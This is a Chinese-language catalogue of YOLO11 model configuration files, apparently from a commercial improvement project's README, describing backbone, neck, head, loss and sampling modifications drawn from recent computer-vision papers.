ultralytics/cfg/models/11/yolo11-RevCol.yaml
使用(ICLR2023)Reversible Column Networks对yolo11主干进行重设计,里面的支持更换不同的C3k2-Block.
EMASlideLoss
使用EMA思想与SlideLoss进行相结合.
ultralytics/cfg/models/11/yolo11-dyhead-DCNV3.yaml
使用DCNV3替换DyHead中的DCNV2.
ultralytics/cfg/models/11/yolo11-C3k2-EMBC.yaml
使用Efficientnet中的MBConv与EffectiveSE改进C3k2.
ultralytics/cfg/models/11/yolo11-GhostHGNetV2.yaml
使用Ghost_HGNetV2作为YOLO11的backbone.
ultralytics/cfg/models/11/yolo11-RepHGNetV2.yaml
使用Rep_HGNetV2作为YOLO11的backbone.
ultralytics/cfg/models/11/yolo11-C3k2-DWR-DRB.yaml
使用UniRepLKNet中的DilatedReparamBlock对DWRSeg中的Dilation-wise Residual(DWR)的模块进行二次创新后改进C3k2.
ultralytics/cfg/models/11/yolo11-ASF-P2.yaml
在ultralytics/cfg/models/11/yolo11-ASF.yaml的基础上进行二次创新，引入P2检测层并对网络结构进行优化.
ultralytics/cfg/models/11/yolo11-CSP-EDLAN.yaml
使用DualConv打造CSP Efficient Dual Layer Aggregation Networks改进yolo11.
ultralytics/cfg/models/11/yolo11-bifpn-SDI.yaml
使用U-NetV2中的 Semantics and Detail Infusion Module对BIFPN进行二次创新.
ultralytics/cfg/models/11/yolo11-goldyolo-asf.yaml
利用华为2023最新GOLD-YOLO中的Gatherand-Distribute与ASF-YOLO中的Attentional Scale Sequence Fusion进行二次创新改进yolo11的neck.
ultralytics/cfg/models/11/yolo11-dyhead-DCNV4.yaml
使用DCNV4对DyHead进行二次创新.(请关闭AMP进行训练,使用教程请看20240116版本更新说明)
ultralytics/cfg/models/11/yolo11-HSPAN.yaml
对MFDS-DETR中的HS-FPN进行二次创新后得到HSPAN改进yolo11的neck.
ultralytics/cfg/models/11/yolo11-GDFPN.yaml
使用DAMO-YOLO中的RepGFPN与ICCV2023 DySample进行二次创新改进Neck.
ultralytics/cfg/models/11/yolo11-HSPAN-DySample.yaml
对MFDS-DETR中的HS-FPN进行二次创新后得到HSPAN再进行创新,使用ICCV2023 DySample改进其上采样模块.
ultralytics/cfg/models/11/yolo11-ASF-DySample.yaml
使用ASF-YOLO中的Attentional Scale Sequence Fusion与ICCV2023 DySample组合得到Dynamic Sample Attentional Scale Sequence Fusion.
ultralytics/cfg/models/11/yolo11-C3k2-DCNV2-Dynamic.yaml
利用自研注意力机制MPCA强化DCNV2中的offset和mask.
ultralytics/cfg/models/11/yolo11-C3k2-iRMB-Cascaded.yaml
使用EfficientViT CVPR2023中的CascadedGroupAttention对EMO ICCV2023中的iRMB进行二次创新来改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-iRMB-DRB.yaml
使用UniRepLKNet中的DilatedReparamBlock对EMO ICCV2023中的iRMB进行二次创新来改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-iRMB-SWC.yaml
使用shift-wise conv对EMO ICCV2023中的iRMB进行二次创新来改进C3k2.
ultralytics/cfg/models/11/yolo11-DBBNCSPELAN.yaml
使用Diverse Branch Block CVPR2021对YOLOV9中的RepNCSPELAN进行二次创新后改进yolo11.
ultralytics/cfg/models/11/yolo11-OREPANCSPELAN.yaml
使用Online Convolutional Re-parameterization (CVPR2022)对YOLOV9中的RepNCSPELAN进行二次创新后改进yolo11.
ultralytics/cfg/models/11/yolo11-DRBNCSPELAN.yaml
使用UniRepLKNet中的DilatedReparamBlock对YOLOV9中的RepNCSPELAN进行二次创新后改进yolo11.
ultralytics/cfg/models/11/yolo11-DynamicHGNetV2.yaml
使用CVPR2024 parameternet中的DynamicConv对CVPR2024 RTDETR中的HGBlokc进行二次创新.
ultralytics/cfg/models/11/yolo11-C3k2-RVB-EMA.yaml
使用CVPR2024 RepViT中的RepViTBlock和EMA注意力机制改进C3k2.
ultralytics/cfg/models/11/yolo11-ELA-HSFPN.yaml
使用Efficient Local Attention改进HSFPN.
ultralytics/cfg/models/11/yolo11-CA-HSFPN.yaml
使用Coordinate Attention CVPR2021改进HSFPN.
ultralytics/cfg/models/11/yolo11-CAA-HSFPN.yaml
使用CVPR2024 PKINet中的CAA模块HSFPN.
ultralytics/cfg/models/11/yolo11-CSMHSA.yaml
对Mutil-Head Self-Attention进行创新得到Cross-Scale Mutil-Head Self-Attention.
由于高维通常包含更高级别的语义信息，而低维包含更多细节信息，因此高维信息作为query，而低维信息作为key和Value，将两者结合起来可以利用高维的特征帮助低维的特征进行精细过滤，可以实现更全面和丰富的特征表达。
通过使用高维的上采样信息进行Query操作，可以更好地捕捉到目标的全局信息，从而有助于增强模型对目标的识别和定位能力。
ultralytics/cfg/models/11/yolo11-CAFMFusion.yaml
利用具有HCANet中的CAFM，其具有获取全局和局部信息的注意力机制进行二次改进content-guided attention fusion.
ultralytics/cfg/models/11/yolo11-C3k2-Faster-CGLU.yaml
使用TransNeXt CVPR2024中的Convolutional GLU对CVPR2023中的FasterNet进行二次创新.
ultralytics/cfg/models/11/yolo11-C3k2-Star-CAA.yaml
使用StarNet CVPR2024中的StarBlock和CVPR2024 PKINet中的CAA改进C3k2.
ultralytics/cfg/models/11/yolo11-bifpn-GLSA.yaml
使用GLSA模块对bifpn进行二次创新.
ultralytics/cfg/models/11/yolo11-BIMAFPN.yaml
利用BIFPN的思想对MAF-YOLO的MAFPN进行二次改进得到BIMAFPN.
ultralytics/cfg/models/11/yolo11-C3k2-AdditiveBlock-CGLU.yaml
使用CAS-ViT中的AdditiveBlock和TransNeXt CVPR2024中的Convolutional GLU改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-MSMHSA-CGLU.yaml
使用CMTFNet中的M2SA和TransNeXt CVPR2024中的Convolutional GLU改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-IdentityFormer-CGLU.yaml
使用Metaformer TPAMI2024中的IdentityFormer和TransNeXt CVPR2024中的CGLU改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-RandomMixing-CGLU.yaml
使用Metaformer TPAMI2024中的RandomMixing和TransNeXt CVPR2024中的CGLU改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-PoolingFormer-CGLU.yaml
使用Metaformer TPAMI2024中的PoolingFormer和TransNeXt CVPR2024中的CGLU改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-ConvFormer-CGLU.yaml
使用Metaformer TPAMI2024中的ConvFormer和TransNeXt CVPR2024中的CGLU改进C3k2.
ultralytics/cfg/models/11/yolo11-C3k2-CaFormer-CGLU.yaml
使用Metaformer TPAMI2024中的CaFormer和TransNeXt CVPR2024中的CGLU改进C3k2.
自研系列
ultralytics/cfg/models/11/yolo11-LAWDS.yaml
Light Adaptive-weight downsampling.自研模块,具体讲解请看百度云链接中的视频.
ultralytics/cfg/models/11/yolo11-C3k2-EMSC.yaml
Efficient Multi-Scale Conv.自研模块,具体讲解请看百度云链接中的视频.
ultralytics/cfg/models/11/yolo11-C3k2-EMSCP.yaml
Efficient Multi-Scale Conv Plus.自研模块,具体讲解请看百度云链接中的视频.
Lightweight Shared Convolutional Detection Head
自研轻量化检测头.
detect:ultralytics/cfg/models/11/yolo11-LSCD.yaml
seg:ultralytics/cfg/models/11/yolo11-seg-LSCD.yaml
pose:ultralytics/cfg/models/11/yolo11-pose-LSCD.yaml
obb:ultralytics/cfg/models/11/yolo11-obb-LSCD.yaml
GroupNorm在FOCS论文中已经证实可以提升检测头定位和分类的性能.
通过使用共享卷积，可以大幅减少参数数量，这使得模型更轻便，特别是在资源受限的设备上.
在使用共享卷积的同时，为了应对每个检测头所检测的目标尺度不一致的问题，使用Scale层对特征进行缩放.
综合以上，我们可以让检测头做到参数量更少、计算量更少的情况下，尽可能减少精度的损失.
Task Align Dynamic Detection Head
自研任务对齐动态检测头.
detect:ultralytics/cfg/models/11/yolo11-TADDH.yaml
seg:ultralytics/cfg/models/11/yolo11-seg-TADDH.yaml
pose:ultralytics/cfg/models/11/yolo11-pose-TADDH.yaml
obb:ultralytics/cfg/models/11/yolo11-obb-TADDH.yaml
GroupNorm在FCOS论文中已经证实可以提升检测头定位和分类的性能.
通过使用共享卷积，可以大幅减少参数数量，这使得模型更轻便，特别是在资源受限的设备上.并且在使用共享卷积的同时，为了应对每个检测头所检测的目标尺度不一致的问题，使用Scale层对特征进行缩放.
参照TOOD的思想,除了标签分配策略上的任务对齐,我们也在检测头上进行定制任务对齐的结构,现有的目标检测器头部通常使用独立的分类和定位分支,这会导致两个任务之间缺乏交互,TADDH通过特征提取器从多个卷积层中学习任务交互特征,得到联合特征,定位分支使用DCNV2和交互特征生成DCNV2的offset和mask,分类分支使用交互特征进行动态特征选择.
ultralytics/cfg/models/11/yolo11-FDPN.yaml
自研特征聚焦扩散金字塔网络(Focusing Diffusion Pyramid Network)
通过定制的特征聚焦模块与特征扩散机制，能让每个尺度的特征都具有详细的上下文信息，更有利于后续目标的检测与分类。
定制的特征聚焦模块可以接受三个尺度的输入，其内部包含一个Inception-Style的模块，其利用一组并行深度卷积来捕获丰富的跨多个尺度的信息。
通过扩散机制使具有丰富的上下文信息的特征进行扩散到各个检测尺度.
ultralytics/cfg/models/11/yolo11-FDPN-DASI.yaml
使用HCFNet中的Dimension-Aware Selective Integration Module对自研的Focusing Diffusion Pyramid Network再次创新.
ultralytics/cfg/models/11/yolo11-RGCSPELAN.yaml
自研RepGhostCSPELAN.
参考GhostNet中的思想(主流CNN计算的中间特征映射存在广泛的冗余)，采用廉价的操作生成一部分冗余特征图，以此来降低计算量和参数量。
舍弃yolov5与yolo11中常用的BottleNeck，为了弥补舍弃残差块所带来的性能损失，在梯度流通分支上使用RepConv，以此来增强特征提取和梯度流通的能力，并且RepConv可以在推理的时候进行融合，一举两得。
可以通过缩放因子控制RGCSPELAN的大小，使其可以兼顾小模型和大模型。
Lightweight Shared Convolutional Separamter BN Detection Head
基于自研轻量化检测头上，参考NASFPN的设计思路把GN换成BN，并且BN层参数不共享.
detect:ultralytics/cfg/models/11/yolo11-LSCSBD.yaml
seg:ultralytics/cfg/models/11/yolo11-seg-LSCSBD.yaml
pose:ultralytics/cfg/models/11/yolo11-pose-LSCSBD.yaml
obb:ultralytics/cfg/models/11/yolo11-obb-LSCSBD.yaml
由于不同层级之间特征的统计量仍存在差异，Normalization layer依然是必须的，由于直接在共享参数的检测头中引入BN会导致其滑动平均值产生误差，而引入 GN 又会增加推理时的开销，因此我们参考NASFPN的做法，让检测头共享卷积层，而BN则分别独立计算。
ultralytics/cfg/models/11/yolo11-EIEStem.yaml
通过SobelConv分支，可以提取图像的边缘信息。由于Sobel滤波器可以检测图像中强度的突然变化，因此可以很好地捕捉图像的边缘特征。这些边缘特征在许多计算机视觉任务中都非常重要，例如图像分割和物体检测。
EIEStem模块还结合空间信息，除了边缘信息，EIEStem还通过池化分支提取空间信息，保留重要的空间信息。结合边缘信息和空间信息，可以帮助模型更好地理解图像内容。
通过3D组卷积高效实现Sobel算子。
ultralytics/cfg/models/11/yolo11-C3k2-EIEM.yaml
提出了一种新的EIEStem模块，旨在作为图像识别任务中的高效前端模块。该模块结合了提取边缘信息的SobelConv分支和提取空间信息的卷积分支，能够学习到更加丰富的图像特征表示。
边缘信息学习: 卷积神经网络 (CNN)通常擅长学习空间信息，但是对于提取图像中的边缘信息可能稍显不足。EIEStem 模块通过SobelConv分支，显式地提取图像的边缘特征。Sobel滤波器是一种经典的边缘检测滤波器，可以有效地捕捉图像中强度的突然变化，从而获得重要的边缘信息。
空间信息保留: 除了边缘信息，图像中的空间信息也同样重要。EIEStem模块通过一个额外的卷积分支 (conv_branch) 来提取空间信息。与SobelCon 分支不同，conv_branch提取的是原始图像的特征，可以保留丰富的空间细节。
特征融合: EIEStem模块将来自SobelConv分支和conv_branch提取的特征进行融合 (concatenate)。 这种融合操作使得学习到的特征表示既包含了丰富的边缘信息，又包含了空间信息，能够更加全面地刻画图像内容。
ultralytics/cfg/models/11/yolo11-ContextGuideFPN.yaml
Context Guide Fusion Module（CGFM）是一个创新的特征融合模块，旨在改进YOLO11中的特征金字塔网络（FPN）。该模块的设计考虑了多尺度特征融合过程中上下文信息的引导和自适应调整。
上下文信息的有效融合：通过SE注意力机制，模块能够在特征融合过程中捕捉并利用重要的上下文信息，从而增强特征表示的有效性，并有效引导模型学习检测目标的信息，从而提高模型的检测精度。
特征增强：通过权重化的特征重组操作，模块能够增强重要特征，同时抑制不重要特征，提升特征图的判别能力。
简单高效：模块结构相对简单，不会引入过多的计算开销，适合在实时目标检测任务中应用。
这期视频讲解在B站:https://www.bilibili.com/video/BV1Vx4y1n7hZ/
ultralytics/cfg/models/11/yolo11-LSDECD.yaml
基于自研轻量化检测头上(LSCD)，使用detail-enhanced convolution进一步改进，提高检测头的细节捕获能力，进一步改善检测精度.
detect:ultralytics/cfg/models/11/yolo11-LSDECD.yaml
segment:ultralytics/cfg/models/11/yolo11-seg-LSDECD.yaml
pose:ultralytics/cfg/models/11/yolo11-pose-LSDECD.yaml
obb:ultralytics/cfg/models/11/yolo11-obb-LSDECD.yaml
DEA-Net中设计了一个细节增强卷积（DEConv），具体来说DEConv将先验信息整合到普通卷积层，以增强表征和泛化能力。然后，通过使用重参数化技术，DEConv等效地转换为普通卷积，不需要额外的参数和计算成本。
ultralytics/cfg/models/11/yolo11-C3k2-SMPCGLU.yaml
Self-moving Point Convolutional GLU模型改进C3k2.
SMP来源于CVPR2023-SMPConv,Convolutional GLU来源于TransNeXt CVPR2024.
普通的卷积在面对数据中的多样性和复杂性时，可能无法捕捉到有效的特征，因此我们采用了SMPConv，其具备最新的自适应点移动机制，从而更好地捕捉局部特征，提高特征提取的灵活性和准确性。
在SMPConv后添加CGLU，Convolutional GLU 结合了卷积和门控机制，能够选择性地通过信息通道，提高了特征提取的有效性和灵活性。
Re-CalibrationFPN
为了加强浅层和深层特征的相互交互能力，推出重校准特征金字塔网络(Re-CalibrationFPN).
P2345：ultralytics/cfg/models/11/yolo11-ReCalibrationFPN-P2345.yaml(带有小目标检测头的ReCalibrationFPN)
P345：ultralytics/cfg/models/11/yolo11-ReCalibrationFPN-P345.yaml
P3456：ultralytics/cfg/models/11/yolo11-ReCalibrationFPN-P3456.yaml(带有大目标检测头的ReCalibrationFPN)
浅层语义较少，但细节丰富，有更明显的边界和减少失真。此外，深层蕴藏着丰富的物质语义信息。因此，直接融合低级具有高级特性的特性可能导致冗余和不一致。为了解决这个问题，我们提出了SBA模块，它有选择地聚合边界信息和语义信息来描绘更细粒度的物体轮廓和重新校准物体的位置。
相比传统的FPN结构，SBA模块引入了高分辨率和低分辨率特征之间的双向融合机制，使得特征之间的信息传递更加充分，进一步提升了多尺度特征融合的效果。
SBA模块通过自适应的注意力机制，根据特征图的不同分辨率和内容，自适应地调整特征的权重，从而更好地捕捉目标的多尺度特征。
ultralytics/cfg/models/11/yolo11-CSP-PTB.yaml
Cross Stage Partial - Partially Transformer Block
在计算机视觉任务中，Transformer结构因其强大的全局特征提取能力而受到广泛关注。然而，由于Transformer结构的计算复杂度较高，直接将其应用于所有通道会导致显著的计算开销。为了在保证高效特征提取的同时降低计算成本，我们设计了一种混合结构，将输入特征图分为两部分，分别由CNN和Transformer处理，结合了卷积神经网络(CNN)和Transformer机制的模块，旨在增强特征提取的能力。
我们提出了一种名为CSP_PTB(Cross Stage Partial - Partially Transformer Block)的模块，旨在结合CNN和Transformer的优势，通过对输入通道进行部分分配来优化计算效率和特征提取能力。
融合局部和全局特征：多项研究表明，CNN的感受野大小较少，导致其只能提取局部特征，但Transformer的MHSA能够提取全局特征，能够同时利用两者的优势。
保证高效特征提取的同时降低计算成本：为了能引入Transformer结构来提取全局特征又不想大幅度增加计算复杂度，因此提出Partially Transformer Block，只对部分通道使用TransformerBlock。
MHSA_CGLU包含Mutil-Head-Self-Attention和ConvolutionalGLU(TransNext CVPR2024)，其中Mutil-Head-Self-Attention负责提取全局特征，ConvolutionalGLU用于增强非线性特征表达能力，ConvolutionalGLU相比于传统的FFN，具有更强的性能。
可以根据不同的模型大小和具体的运行情况调节用于Transformer的通道数。
ultralytics/cfg/models/11/yolo11-SOEP.yaml
小目标在正常的P3、P4、P5检测层上略显吃力，比较传统的做法是加上P2检测层来提升小目标的检测能力，但是同时也会带来一系列的问题，例如加上P2检测层后计算量过大、后处理更加耗时等问题，日益激发需要开发新的针对小目标有效的特征金字塔，我们基于原本的PAFPN上进行改进，提出SmallObjectEnhancePyramid，相对于传统的添加P2检测层，我们使用P2特征层经过SPDConv得到富含小目标信息的特征给到P3进行融合，然后使用CSP思想和基于AAAI2024的OmniKernel进行改进得到CSP-OmniKernel进行特征整合，OmniKernel模块由三个分支组成，即三个分支，即全局分支、大分支和局部分支、以有效地学习从全局到局部的特征表征，最终从而提高小目标的检测性能。(该模块需要在train.py中关闭amp、且在ultralytics/engine/validator.py 115行附近的self.args.half设置为False、跑其余改进记得修改回去！)
出现这个报错的:RuntimeError: cuFFT error: CUFFT_INTERNAL_ERROR,如果你是40系显卡,需要更新torch大于2.0，并且cuda大于12.0.
ultralytics/cfg/models/11/yolo11-CGRFPN.yaml
Context-Guided Spatial Feature Reconstruction Feature Pyramid Network.
借鉴ECCV2024-CGRSeg中的Rectangular Self-Calibration Module经过精心设计,用于空间特征重建和金字塔上下文提取,它在水平和垂直方向上捕获全局上下文，并获得轴向全局上下文来显式地建模矩形关键区域.
PyramidContextExtraction Module使用金字塔上下文提取模块（PyramidContextExtraction），有效整合不同层级的特征信息，提升模型的上下文感知能力。
FuseBlockMulti 和 DynamicInterpolationFusion 这些模块用于多尺度特征的融合，通过动态插值和多特征融合，进一步提高了模型的多尺度特征表示能力和提升模型对复杂背景下目标的识别能力。
ultralytics/cfg/models/11/yolo11-FeaturePyramidSharedConv.yaml
多尺度特征提取
通过使用不同膨胀率的卷积层，模块能够提取不同尺度的特征。这对捕捉图像中不同大小和不同上下文的信息非常有利。
低膨胀率捕捉局部细节，高膨胀率捕捉全局上下文。
参数共享
使用共享的卷积层 self.share_conv，大大减少了需要训练的参数数量。相比于每个膨胀率使用独立的卷积层，共享卷积层能够减少冗余，提升模型效率。
减少了模型的存储和计算开销，提升了计算效率。
高效的通道变换
通过1x1卷积层 self.cv1 和 self.cv2，模块能够高效地调整通道数，并进行特征融合。1x1卷积层在减少参数量的同时还能保留重要的特征信息。
更细粒度的特征提取
FeaturePyramidSharedConv 使用卷积操作进行特征提取，能够捕捉更加细粒度的特征。相比之下，SPPF 的池化操作可能会丢失一些细节信息。
卷积操作在特征提取时具有更高的灵活性和表达能力，可以更好地捕捉图像中的细节和复杂模式。
APT(Adaptive Power Transformation)-TAL.
为了使不同gt预测对的匹配质量和损失权重更具鉴别性，我们通过自定义的PowerTransformer显著增强高质量预测框的权重，抑制低质量预测框的影响，并使模型在学习的过程可以更关注质量高的预测框。
ultralytics/cfg/models/11/yolo11-EMBSFPN.yaml
基于BIFPN、MAF-YOLO、CVPR2024 EMCAD提出全新的Efficient Multi-Branch&amp;Scale FPN.
Efficient Multi-Branch&amp;Scale FPN拥有&lt;轻量化&gt;、&lt;多尺度特征加权融合&gt;、&lt;多尺度高效卷积模块&gt;、&lt;高效上采样模块&gt;、&lt;全局异构核选择机制&gt;。
具有多尺度高效卷积模块和全局异构核选择机制，Trident网络的研究表明，具有较大感受野的网络更适合检测较大的物体，反之，较小尺度的目标则从较小的感受野中受益，因此我们在FPN阶段，对于不同尺度的特征层选择不同的多尺度卷积核以适应并逐步获得多尺度感知场信息。
借鉴BIFPN中的多尺度特征加权融合，能把Concat换成Add来减少参数量和计算量的情况下，还能通过不同尺度特征的重要性进行自适用选择加权融合。
高效上采样模块来源于CVPR2024-EMCAD中的EUCB，能够在保证一定效果的同时保持高效性。
ultralytics/cfg/models/11/yolo11-CSP-PMSFA.yaml
自研模块:CSP-Partial Multi-Scale Feature Aggregation.
部分多尺度特征提取：参考CVPR2020-GhostNet、CVPR2024-FasterNet的思想，采用高效的PartialConv，该模块能够从输入中提取多种尺度的特征信息，但它并不是在所有通道上进行这种操作，而是部分（Partial）地进行，从而提高了计算效率。
增强的特征融合: 最后的 1x1 卷积层通过将不同尺度的特征融合在一起，同时使用残差连接将输入特征与处理后的特征相加，有效保留了原始信息并引入了新的多尺度信息，从而提高模型的表达能力。
ultralytics/cfg/models/11/yolo11-MutilBackbone-DAF.yaml
自研MutilBackbone-DynamicAlignFusion.
为了避免在浅层特征图上消耗过多计算资源，设计的MutilBackbone共享一个stem的信息，这个设计有利于避免计算量过大，推理时间过大的问题。
为了避免不同Backbone信息融合出现不同来源特征之间的空间差异，我们为此设计了DynamicAlignFusion，其先通过融合来自两个不同模块学习到的特征，然后生成一个名为DynamicAlignWeight去调整各自的特征，最后使用一个可学习的通道权重，其可以根据输入特征动态调整两条路径的权重，从而增强模型对不同特征的适应能力。
BackBone系列
ultralytics/cfg/models/11/yolo11-efficientViT.yaml
(CVPR2023)efficientViT替换yolo11主干.
ultralytics/cfg/models/11/yolo11-fasternet.yaml
(CVPR2023)fasternet替换yolo11主干.
ultralytics/cfg/models/11/yolo11-timm.yaml
使用timm支持的主干网络替换yolo11主干.
ultralytics/cfg/models/11/yolo11-convnextv2.yaml
使用convnextv2网络替换yolo11主干.
ultralytics/cfg/models/11/yolo11-EfficientFormerV2.yaml
使用EfficientFormerV2网络替换yolo11主干.(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-vanillanet.yaml
vanillanet替换yolo11主干.
ultralytics/cfg/models/11/yolo11-LSKNet.yaml
LSKNet(2023旋转目标检测SOTA的主干)替换yolo11主干.
ultralytics/cfg/models/11/yolo11-swintransformer.yaml
SwinTransformer-Tiny替换yolo11主干.
ultralytics/cfg/models/11/yolo11-repvit.yaml
RepViT替换yolo11主干.
ultralytics/cfg/models/11/yolo11-CSwinTransformer.yaml
使用CSWin-Transformer(CVPR2022)替换yolo11主干.(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-HGNetV2.yaml
使用HGNetV2作为YOLO11的backbone.
ultralytics/cfg/models/11/yolo11-unireplknet.yaml
使用UniRepLKNet替换yolo11主干.
ultralytics/cfg/models/11/yolo11-TransNeXt.yaml
使用TransNeXt改进yolo11的backbone.(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/rt-detr/yolo11-rmt.yaml
使用CVPR2024 RMT改进rtdetr的主干.
ultralytics/cfg/models/11/yolo11-pkinet.yaml
使用CVPR2024 PKINet改进backbone.(需要安装mmcv和mmengine)
ultralytics/cfg/models/11/yolo11-mobilenetv4.yaml
使用MobileNetV4改进yolo11-backbone.
ultralytics/cfg/models/11/yolo11-starnet.yaml
使用StarNet CVPR2024改进yolo11-backbone.
SPPF系列
ultralytics/cfg/models/11/yolo11-FocalModulation.yaml
使用Focal Modulation替换SPPF.
ultralytics/cfg/models/11/yolo11-SPPF-LSKA.yaml
使用LSKA注意力机制改进SPPF,增强多尺度特征提取能力.
ultralytics/cfg/models/11/yolo11-AIFI.yaml
使用RT-DETR中的Attention-based Intrascale Feature Interaction(AIFI)改进yolo11.
ultralytics/cfg/models/11/yolo11-AIFIRepBN.yaml
使用ICML-2024 SLAB中的RepBN改进AIFI.
Neck系列
ultralytics/cfg/models/11/yolo11-bifpn.yaml
添加BIFPN到yolo11中.
其中BIFPN中有三个可选参数：
Fusion
其中BIFPN中的Fusion模块支持五种: weight, adaptive, concat, bifpn(default), SDI
其中weight, adaptive, concat出自paper链接-Figure 3, SDI出自U-NetV2
node_mode
支持大部分C3k2-XXX结构.
head_channel
BIFPN中的通道数,默认设置为256.
ultralytics/cfg/models/11/yolo11-slimneck.yaml
使用VoVGSCSP\VoVGSCSPC和GSConv替换yolo11 neck中的C3k2和Conv.
Asymptotic Feature Pyramid Networkreference
a. ultralytics/cfg/models/11/yolo11-AFPN-P345.yaml
b. ultralytics/cfg/models/11/yolo11-AFPN-P345-Custom.yaml
c. ultralytics/cfg/models/11/yolo11-AFPN-P2345.yaml
d. ultralytics/cfg/models/11/yolo11-AFPN-P2345-Custom.yaml
其中Custom中的block支持大部分C3k2-XXX结构.
ultralytics/cfg/models/11/yolo11-RCSOSA.yaml
使用RCS-YOLO中的RCSOSA替换C3k2.
ultralytics/cfg/models/11/yolo11-goldyolo.yaml
利用华为2023最新GOLD-YOLO中的Gatherand-Distribute进行改进特征融合模块
ultralytics/cfg/models/11/yolo11-GFPN.yaml
使用DAMO-YOLO中的RepGFPN改进Neck.
ultralytics/cfg/models/11/yolo11-EfficientRepBiPAN.yaml
使用YOLOV6中的EfficientRepBiPAN改进Neck.
ultralytics/cfg/models/11/yolo11-ASF.yaml
使用ASF-YOLO中的Attentional Scale Sequence Fusion改进yolo11.
ultralytics/cfg/models/11/yolo11-SDI.yaml
使用U-NetV2中的 Semantics and Detail Infusion Module对yolo11中的feature fusion部分进行重设计.
ultralytics/cfg/models/11/yolo11-HSFPN.yaml
使用MFDS-DETR中的HS-FPN改进yolo11的neck.
ultralytics/cfg/models/11/yolo11-CSFCN.yaml
使用Context and Spatial Feature Calibration for Real-Time Semantic Segmentation中的Context and Spatial Feature Calibration模块改进yolo11.
ultralytics/cfg/models/11/yolo11-CGAFusion.yaml
使用DEA-Net中的content-guided attention fusion改进yolo11-neck.
ultralytics/cfg/models/11/yolo11-SDFM.yaml
使用PSFusion中的superficial detail fusion module改进yolo11-neck.
ultralytics/cfg/models/11/yolo11-PSFM.yaml
使用PSFusion中的profound semantic fusion module改进yolo11-neck.
ultralytics/cfg/models/11/yolo11-GLSA.yaml
使用GLSA模块改进yolo11的neck.
ultralytics/cfg/models/11/yolo11-CTrans.yaml
使用[AAAI2022] UCTransNet中的ChannelTransformer改进yolo11-neck.(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-p6-CTrans.yaml
使用[AAAI2022] UCTransNet中的ChannelTransformer改进yolo11-neck.(带有p6版本)(需要看常见错误和解决方案的第五点)
ultralytics/cfg/models/11/yolo11-MAFPN.yaml
使用MAF-YOLO的MAFPN改进Neck.
Cross-Layer Feature Pyramid Transformer.
P345:ultralytics/cfg/models/11/yolo11-CFPT.yaml
P2345:ultralytics/cfg/models/11/yolo11-CFPT-P2345.yaml
P3456:ultralytics/cfg/models/11/yolo11-CFPT-P3456.yaml
P23456:ultralytics/cfg/models/11/yolo11-CFPT-P23456.yaml
使用CFPT改进neck.
Head系列
ultralytics/cfg/models/11/yolo11-dyhead.yaml
添加基于注意力机制的目标检测头到yolo11中.
ultralytics/cfg/models/11/yolo11-EfficientHead.yaml
对检测头进行重设计,支持10种轻量化检测头.详细请看ultralytics/nn/extra_modules/head.py中的Detect_Efficient class.
ultralytics/cfg/models/11/yolo11-aux.yaml
参考YOLOV7-Aux对YOLO11添加额外辅助训练头,在训练阶段参与训练,在最终推理阶段去掉.
其中辅助训练头的损失权重系数可在ultralytics/utils/loss.py中的class 11DetectionLoss中的__init__函数中的self.aux_loss_ratio设定,默认值参考yolov7为0.25.
ultralytics/cfg/models/11/yolo11-seg-EfficientHead.yaml(实例分割)
对检测头进行重设计,支持10种轻量化检测头.详细请看ultralytics/nn/extra_modules/head.py中的Detect_Efficient class.
ultralytics/cfg/models/11/yolo11-SEAMHead.yaml
使用YOLO-Face V2中的遮挡感知注意力改进Head,使其有效地处理遮挡场景.
ultralytics/cfg/models/11/yolo11-MultiSEAMHead.yaml
使用YOLO-Face V2中的遮挡感知注意力改进Head,使其有效地处理遮挡场景.
ultralytics/cfg/models/11/yolo11-PGI.yaml
使用YOLOV9的programmable gradient information改进YOLO11.(PGI模块可在训练结束后去掉)
Lightweight Asymmetric Detection Head
detect:ultralytics/cfg/models/11/yolo11-LADH.yaml
segment:ultralytics/cfg/models/11/yolo11-seg-LADH.yaml
pose:ultralytics/cfg/models/11/yolo11-pose-LADH.yaml
obb:ultralytics/cfg/models/11/yolo11-obb-LADH.yaml
使用Faster and Lightweight: An Improved YOLOv5 Object Detector for Remote Sensing Images中的Lightweight Asymmetric Detection Head改进yolo11-head.
Label Assign系列
Adaptive Training Sample Selection匹配策略.
在ultralytics/utils/loss.py中的class 11DetectionLoss中自行选择对应的self.assigner即可.
PostProcess系列
soft-nms(IoU,GIoU,DIoU,CIoU,EIoU,SIoU,ShapeIoU)
soft-nms替换nms.(建议:仅在val.py时候使用,具体替换请看20240122版本更新说明)
ultralytics/cfg/models/11/yolo11-nmsfree.yaml
仿照yolov10的思想采用双重标签分配和一致匹配度量进行训练,后处理不需要NMS!
上下采样算子
ultralytics/cfg/models/11/yolo11-ContextGuidedDown.yaml
使用CGNet中的Light-weight Context Guided DownSample进行下采样.
ultralytics/cfg/models/11/yolo11-SPDConv.yaml
使用SPDConv进行下采样.
ultralytics/cfg/models/11/yolo11-dysample.yaml
使用ICCV2023 DySample改进yolo11-neck中的上采样.
ultralytics/cfg/models/11/yolo11-CARAFE.yaml
使用ICCV2019 CARAFE改进yolo11-neck中的上采样.
ultralytics/cfg/models/11/yolo11-HWD.yaml
使用Haar wavelet downsampling改进yolo11的下采样.(请关闭AMP情况下使用)
ultralytics/cfg/models/11/yolo11-v7DS.yaml
使用YOLOV7 CVPR2023的下采样结构改进YOLO11中的下采样.
ultralytics/cfg/models/11/yolo11-ADown.yaml
使用YOLOV9的下采样结构改进YOLO11中的下采样.
ultralytics/cfg/models/11/yolo11-SRFD.yaml
使用A Robust Feature Downsampling Module for Remote Sensing Visual Tasks改进yolo11的下采样.
ultralytics/cfg/models/11/yolo11-WaveletPool.yaml
使用Wavelet Pooling改进YOLO11的上采样和下采样。
ultralytics/cfg/models/11/yolo11-LDConv.yaml
使用LDConv改进下采样.
YOLO11-C3k2系列
ultralytics/cfg/models/11/yolo11-C3k2-Faster.yaml
